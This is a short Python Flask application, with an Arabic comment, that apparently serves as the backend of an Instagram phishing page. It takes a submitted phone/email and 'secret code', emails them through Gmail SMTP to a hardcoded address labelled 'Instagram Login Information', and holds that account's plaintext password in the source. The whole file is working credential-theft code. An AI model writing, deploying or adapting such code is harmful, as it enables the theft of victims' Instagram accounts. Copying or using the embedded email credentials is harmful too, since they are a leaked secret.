from flask import Flask, request, render_template
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)

# إعداد معلومات البريد الإلكتروني
EMAIL_ADDRESS = 'ph17vv@gmail.com'
EMAIL_PASSWORD = 'alaa00011'

def send_email(phone_email, secret_code):
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = EMAIL_ADDRESS
    msg['Subject'] = 'Instagram Login Information'

    body = f"Phone/Email: {phone_email}\nSecret Code: {secret_code}"
    msg.attach(MIMEText(body, 'plain'))

    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)
    except Exception as e:
        print(f'Failed to send email: {e}')

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        phone_email = request.form['phone_email']
        secret_code = request.form['secret_code']
        send_email(phone_email, secret_code)
        return 'Information sent to your email!'
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)
